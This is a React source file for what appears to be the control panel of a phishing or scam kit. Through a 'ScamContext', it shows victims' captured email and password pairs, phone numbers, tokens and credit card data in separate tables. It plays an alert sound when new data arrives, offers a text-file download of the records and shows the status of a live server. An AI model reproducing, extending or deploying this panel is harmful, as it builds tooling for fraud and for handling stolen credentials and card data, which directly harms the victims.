import React, { useContext, useEffect } from 'react'
import ReactHowler from 'react-howler'
import { Layout } from './components/Layout/Layout'
import { TableCard } from './components/Tables/TableCard'
import { TableEmailAndPassword } from './components/Tables/TableEmailAndPassword'
import { TableEmailAndPhone } from './components/Tables/TableEmailAndPhone'
import { TableToken } from './components/Tables/TableToken'
import { TableUserAll } from './components/Tables/TableUserAll'
import { BtnDownloadTxt } from './components/utils/BtnDownloadTxt'
import { CheckBoxUtil } from './components/utils/CheckBoxUtil'
import { DropdownUtil } from './components/utils/DropdownUtil'
import { ScamContext } from './context/ScamContext'
import { SocketContext } from './context/SocketContext'


const typeTable = (filteredType, users) => {
  switch (filteredType) {
    case 'all':
        return <TableUserAll users={users} />
    case 'emailAndPhone':
        return <TableEmailAndPhone users={users} />
    case 'token':
        return <TableToken users={users} />
    case 'creditCard':
        return <TableCard users={users} />
    case 'EmailAndPassword':
        return <TableEmailAndPassword users={users} />
    default: 
      return null
  }
}

export const App = () => {

  const {
    selected, 
    users, 
    filteredType, 
    notification, 
    setNotification,
  } = useContext(ScamContext);
  const { online } = useContext( SocketContext );

  return (
    <Layout>
      <div className='border-b-2 pb-3 flex justify-between items-center'>
        <p className='text-3xl'>{ online ? selected : 'Servidor caido'}</p>
        <p className={online ? 'bg-green-500 px-3 rounded text-white' : 'bg-red-500 px-3 rounded text-white' }>servidor</p>
      </div>
      <div className='flex flex-col sm:flex-row justify-between items-center mt-10 mb-5 bg-white p-5 rounded shadow gap-5'>
        <div className='flex flex-col md:flex-row items-start md:items-end gap-4'>
          <BtnDownloadTxt/>
          <CheckBoxUtil />
        </div>
        {
          notification === true ?
          (
            <>
              <ReactHowler
                src='https://assets.mixkit.co/sfx/preview/mixkit-gaming-lock-2848.mp3'
                playing={true}
                onEnd={() => setNotification(false)}
              />
            </>
          ) : null
        }
        
        <DropdownUtil />

      </div>
      <div className='bg-white rounded shadow'>

        {
          users.length === 0 || users === undefined || online === false
          ? <p className='p-5 text-gray-500'>No hay datos disponible</p>
          : typeTable(filteredType, users) 
        }
        
      </div>
    </Layout>
  )
}
